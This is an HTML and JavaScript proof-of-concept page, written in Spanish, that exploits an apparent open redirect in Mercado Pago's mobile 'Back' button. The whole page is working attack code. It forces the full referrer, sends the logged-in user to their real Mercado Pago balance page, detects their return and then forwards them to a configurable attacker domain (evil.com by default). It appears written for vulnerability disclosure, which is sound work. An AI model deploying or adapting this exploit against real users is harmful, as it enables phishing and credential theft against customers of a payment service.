<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<!-- envia el referrer COMPLETO cross-origin para que MP reciba esta URL -->
<meta name="referrer" content="unsafe-url">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC - Mercado Pago open redirect (CWE-601)</title>
<style>
  body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;max-width:640px;margin:0 auto;padding:24px;line-height:1.5;color:#111}
  h1{font-size:20px} code{background:#f2f2f2;padding:2px 6px;border-radius:4px;word-break:break-all;font-size:13px}
  .ok{background:#e7f7ec;border:1px solid #2eaa5a;padding:16px;border-radius:8px}
  .go{display:inline-block;background:#009ee3;color:#fff;text-decoration:none;padding:14px 20px;border-radius:8px;font-weight:600;margin-top:12px}
  ol{padding-left:20px} small{color:#666}
</style>
</head>
<body>
<div id="app"></div>
<script>
(function(){
  // ==== CONFIG: destino final del atacante (cambiable). Tambien por URL: ...poc.html#evil=https://otro.com ====
  var EVIL = "https://evil.com";
  var mHash = (location.hash.match(/evil=([^&]+)/)||[])[1];
  if (mHash) { try { EVIL = decodeURIComponent(mHash); } catch(e){} }

  var TARGET = "https://www.mercadopago.com.ar/banking/balance";
  var app = document.getElementById("app");
  function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];});}

  // Deteccion de retorno a prueba de balas: un query-param que viaja EN el referrer.
  // Al tocar "go" ponemos ?frompoc=1 en NUESTRA url -> ese es el referrer que ve MP ->
  // el boton Atras hace location.assign(referrer) -> volvemos a esta pagina CON ?frompoc=1.
  // Respaldos: sessionStorage + document.referrer de MP. Se re-evalua en pageshow por si hay bfcache.
  function render(){
    var ref = document.referrer || "";
    var returned = /[?&]frompoc=1/.test(location.search)
                || sessionStorage.getItem('poc_sent') === '1'
                || /mercadopago\.com/i.test(ref);
    if (returned) {
      sessionStorage.removeItem('poc_sent');
      app.innerHTML =
        '<div class="ok"><h1>&#10003; Open redirect CONFIRMADO</h1>'+
        '<p>Llegaste a este origen atacante desde una pagina legitima de Mercado Pago'+
        (ref ? ':</p><code>'+esc(ref)+'</code>' : ' (boton Atras).</p>')+
        '<p style="margin-top:12px">Reenviando a la landing del atacante &rarr; <code>'+esc(EVIL)+'</code> &hellip;</p></div>';
      setTimeout(function(){ location.replace(EVIL); }, 1000);  // -> victima termina en evil.com
    } else {
      app.innerHTML =
        '<h1>PoC &mdash; Open redirect en Mercado Pago (CWE-601)</h1>'+
        '<p>Abri esto en un navegador <b>mobile</b> (o con emulacion mobile en DevTools), '+
        '<b>logueado en Mercado Pago</b>.</p>'+
        '<ol>'+
        '<li>Toca el boton azul de abajo.</li>'+
        '<li>En la pagina de saldo de MP, toca <b>&#8592; Atras</b> (arriba a la izquierda del navbar).</li>'+
        '<li>MP te devuelve a este origen y de aca saltas directo a <code>'+esc(EVIL)+'</code>.</li>'+
        '</ol>'+
        '<a class="go" href="'+TARGET+'">&#9654; Ir a mi saldo de Mercado Pago</a>'+
        '<p><small>El bug: el boton "Atras" del navbar mobile de MP hace '+
        '<code>location.assign(document.referrer)</code> sin validar el host. '+
        'Esta pagina controla el Referer, MP redirige aca, y de aca al destino del atacante.</small></p>';
      var g = document.querySelector('a.go');
      if (g) g.addEventListener('click', function(){
        try { history.replaceState(null, '', location.pathname + '?frompoc=1'); } catch(e){}
        try { sessionStorage.setItem('poc_sent','1'); } catch(e){}
      });
    }
  }
  render();
  // bfcache: al volver de MP, Chrome puede restaurar la pagina sin re-ejecutar el script;
  // pageshow re-evalua el estado para disparar el redirect igual.
  window.addEventListener('pageshow', function(e){ if (e.persisted) render(); });
})();
</script>
</body>
</html>
